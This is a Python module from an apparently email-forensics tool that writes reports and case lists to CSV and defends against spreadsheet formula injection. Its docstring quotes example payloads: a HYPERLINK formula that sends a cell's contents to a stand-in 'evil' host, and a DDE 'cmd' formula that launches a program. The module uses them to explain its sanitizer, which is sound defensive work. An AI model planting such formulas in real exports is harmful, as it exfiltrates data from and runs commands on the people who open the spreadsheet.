"""
Stage 6 OUTPUT: CSV rendering for the forensic report and the case list.

Two renderers, one file format:

* :func:`render_report_csv` - a single spreadsheet for one case: a key/value
  header block (report identity, verdict, the five threat-score pillars,
  origin infrastructure, authentication, evidence hashes and the IOC list)
  followed by the findings table.
* :func:`render_case_list_csv` - the whole case list as one row per case, for
  bulk analysis in Excel, pandas or a pivot table.

Both go through :func:`sanitize_cell`, which is the only interesting part.

Spreadsheet formula injection
-----------------------------
Excel, LibreOffice and Google Sheets treat a cell whose text begins with
``=``, ``+``, ``-`` or ``@`` as a *formula*, not as text, and older Excel also
splits on a leading tab or carriage return.  Every string in these exports is
attacker-controlled: the subject line, the display name, the file name and the
finding detail all come from a message someone else wrote.  A subject of
``=HYPERLINK("http://evil/"&A1,"Click")`` or ``=cmd|'/c calc'!A0`` would
therefore execute in the analyst's spreadsheet the moment the export is
opened - the exported evidence would attack the investigator.

Quoting is not a defence: RFC 4180 quotes are consumed by the CSV parser and
the cell still starts with ``=``.  The fix is to make the cell unambiguously
text by prefixing a single quote, which every major spreadsheet strips on
display.  It is applied to every cell of every export; none of the numeric
fields MailTrace writes can be negative, so no number is affected.
"""
from __future__ import annotations

import csv
import io
import json
from datetime import datetime
from typing import Any, Iterable, Optional

from ..schemas import CaseSummary, ForensicReport, GeoInfo

# Leading characters a spreadsheet reads as the start of a formula (or, for the
# whitespace pair, as a cell break that can smuggle one in).
FORMULA_PREFIXES: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")
FORMULA_GUARD = "'"

# RFC 4180 line ending, which is what Excel expects.
LINE_TERMINATOR = "\r\n"

# Excel assumes the host ANSI code page for a .csv without a byte-order mark,
# which mangles every non-ASCII sender name.  The BOM is prepended by the API
# layer so the string renderers stay pure text.
UTF8_BOM = "\ufeff"

FINDING_COLUMNS: tuple[str, ...] = ("Severity", "Module", "Finding ID", "Title", "Detail", "Evidence (JSON)")
CASE_COLUMNS: tuple[str, ...] = (
    "Email ID", "Analysed at", "Category", "Risk score", "Severity", "Confidence", "Status",
    "Subject", "Sender", "Sender domain", "Origin IP", "Origin country", "Source type",
    "SPF", "DKIM", "DMARC", "Campaign ID", "File name",
)


# --------------------------------------------------------------------------- #
# Cell rendering
# --------------------------------------------------------------------------- #
def _text(value: Any) -> str:
    """One cell's value as plain text, before the formula guard."""
    if value is None:
        return ""
    if isinstance(value, bool):  # checked before int: bool is an int subclass
        return "yes" if value else "no"
    if isinstance(value, datetime):
        return value.isoformat()
    if isinstance(value, float):
        return f"{value:g}"
    if isinstance(value, (list, tuple, set)):
        return "; ".join(_text(item) for item in value)
    if isinstance(value, dict):
        return json.dumps(value, ensure_ascii=False, sort_keys=True, default=str)
    return str(value)


def sanitize_cell(value: Any) -> str:
    """Render ``value`` as a cell that a spreadsheet can only treat as text.

    See the module docstring: a leading ``=``, ``+``, ``-``, ``@``, tab or
    carriage return is neutralised with a leading single quote.
    """
    text = _text(value)
    if text.startswith(FORMULA_PREFIXES):
        return FORMULA_GUARD + text
    return text


def _writer(buffer: io.StringIO) -> Any:
    return csv.writer(buffer, lineterminator=LINE_TERMINATOR, quoting=csv.QUOTE_MINIMAL)


def _row(writer: Any, cells: Iterable[Any]) -> None:
    writer.writerow([sanitize_cell(cell) for cell in cells])


# --------------------------------------------------------------------------- #
# One case: header block + findings table
# --------------------------------------------------------------------------- #
def _geo_rows(geo: Optional[GeoInfo]) -> list[tuple[str, Any]]:
    if geo is None:
        return [("IP", ""), ("Note", "No routable origin was identified in the Received chain")]
    return [
        ("IP", geo.ip),
        ("Country", geo.country),
        ("Country code", geo.country_code),
        ("City", geo.city),
        ("Region", geo.region),
        ("Latitude", geo.lat),
        ("Longitude", geo.lon),
        ("ISP", geo.isp),
        ("Organisation", geo.org),
        ("ASN", geo.asn),
        ("Reverse DNS", geo.reverse_dns),
        ("Tor exit node", geo.is_tor_exit),
        ("VPN or proxy", geo.is_proxy),
        ("Hosting provider", geo.is_hosting),
        ("Blocklists", geo.blacklists),
        ("AbuseIPDB confidence", geo.abuse_confidence),
        ("Geolocation source", geo.source),
    ]


def render_report_csv(report: ForensicReport) -> str:
    """The forensic report as one CSV: header block, then the findings table.

    ``report`` is rendered exactly as given, so a masked report produces a
    masked CSV - the PII policy is applied once, upstream, by the API layer.
    """
    result = report.analysis
    verdict = result.verdict
    pillars = verdict.breakdown
    weights = pillars.weights or {}
    auth = result.headers.auth
    email = result.email
    custody = report.custody

    buffer = io.StringIO()
    writer = _writer(buffer)
    _row(writer, ["MailTrace forensic report"])
    _row(writer, ["Section", "Field", "Value"])

    def block(section: str, rows: list[tuple[str, Any]]) -> None:
        for field, value in rows:
            _row(writer, [section, field, value])

    block("Report", [
        ("Report ID", report.report_id),
        ("Generated at", report.generated_at),
        ("Generated by", report.generated_by),
        ("PII masked", report.masked),
        ("Engine version", result.engine_version),
        ("Processing time (ms)", result.processing_ms),
    ])
    block("Case", [
        ("Email ID", result.id),
        ("File name", result.filename),
        ("Analysed at", result.analyzed_at),
        ("Subject", email.subject),
        ("From", email.sender.address),
        ("From display name", email.sender.display_name),
        ("From domain", email.sender.domain),
        ("Reply-To", [a.address for a in email.reply_to]),
        ("Return-Path", email.return_path.address),
        ("To", [a.address for a in email.to]),
        ("Message date", email.date),
        ("Message-ID", email.message_id),
        ("Campaign ID", result.campaign_id or ""),
    ])
    block("Verdict", [
        ("Category", verdict.category.value),
        ("Risk score (0-100)", verdict.risk_score),
        ("Severity", verdict.severity.value),
        ("Confidence", round(verdict.confidence, 4)),
        ("ML category", verdict.ml_category.value),
        ("Rule category", verdict.rule_category.value),
        ("ML and rules agree", verdict.dual_validation_agreement),
    ])
    # The five terms of the Stage 4 threat score, each 0-100 before weighting.
    block("Threat score", [
        (f"{label} (weight {weights.get(key, 0.0):.2f})", round(getattr(pillars, key), 1))
        for key, label in (
            ("auth", "Authentication"), ("text", "Text / intent"), ("url", "URLs"),
            ("network", "Network"), ("entropy", "Entropy"),
        )
    ] + [("Weighted total", verdict.risk_score)])
    block("Authentication", [
        ("SPF", auth.spf), ("SPF domain", auth.spf_domain), ("SPF aligned", auth.spf_aligned),
        ("DKIM", auth.dkim), ("DKIM domain", auth.dkim_domain), ("DKIM aligned", auth.dkim_aligned),
        ("DMARC", auth.dmarc), ("DMARC policy", auth.dmarc_policy),
    ])
    block("Origin", _geo_rows(result.infrastructure.origin_geo) + [
        ("Originating IP (header chain)", result.headers.originating_ip),
        ("Origin confidence", round(result.headers.origin_confidence, 4)),
        ("Relay hops", len(result.headers.hops)),
    ])
    block("Attribution", [
        ("Source type", result.attribution.source_type),
        ("Confidence", round(result.attribution.confidence, 4)),
        ("Reasoning", result.attribution.reasoning),
    ])
    block("Evidence", [
        ("Raw SHA-256", email.raw_sha256),
        ("Raw MD5", email.raw_md5),
        ("Raw size (bytes)", email.raw_size),
        ("Custody head hash", custody.head_hash),
        ("Custody chain valid", custody.valid),
        ("Custody events", len(custody.events)),
    ])
    for indicator in result.intel.indicators:
        _row(writer, ["IOC", "Indicator", indicator])
    for attachment in result.attachments.attachments:
        _row(writer, ["IOC", f"Attachment SHA-256 ({attachment.filename})", attachment.sha256])
    for action in report.recommended_actions:
        _row(writer, ["Recommended action", "Action", action])

    _row(writer, [])
    _row(writer, ["Findings"])
    _row(writer, FINDING_COLUMNS)
    for finding in result.findings:
        _row(writer, [
            finding.severity.value, finding.module, finding.id, finding.title, finding.detail, finding.evidence,
        ])
    return buffer.getvalue()


# --------------------------------------------------------------------------- #
# The case list
# --------------------------------------------------------------------------- #
def render_case_list_csv(rows: Iterable[CaseSummary]) -> str:
    """The case list as one row per case, in the order the store returned them."""
    buffer = io.StringIO()
    writer = _writer(buffer)
    _row(writer, CASE_COLUMNS)
    for case in rows:
        _row(writer, [
            case.id, case.analyzed_at, case.category.value, case.risk_score, case.severity.value,
            round(case.confidence, 4), case.status, case.subject, case.sender, case.sender_domain,
            case.originating_ip, case.origin_country, case.source_type, case.spf, case.dkim, case.dmarc,
            case.campaign_id or "", case.filename,
        ])
    return buffer.getvalue()
